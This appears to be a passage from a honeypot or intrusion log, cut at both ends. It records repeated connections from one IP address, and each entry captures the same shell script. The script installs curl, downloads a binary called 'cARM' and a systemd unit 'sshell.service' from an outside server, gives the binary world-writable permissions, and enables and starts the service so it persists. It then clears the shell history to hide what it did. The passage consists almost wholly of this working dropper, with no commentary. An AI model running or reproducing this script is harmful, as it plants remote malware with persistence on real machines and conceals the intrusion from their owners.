		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:38.092540 - ('45.148.10.203', 40488) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:42.483444 - ('45.148.10.203', 46542) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:46.110291 - ('45.148.10.203', 46554) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:50.126557 - ('45.148.10.203', 39658) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:53.755603 - ('45.148.10.203', 39676) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:57.592440 - ('45.148.10.203', 39706) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
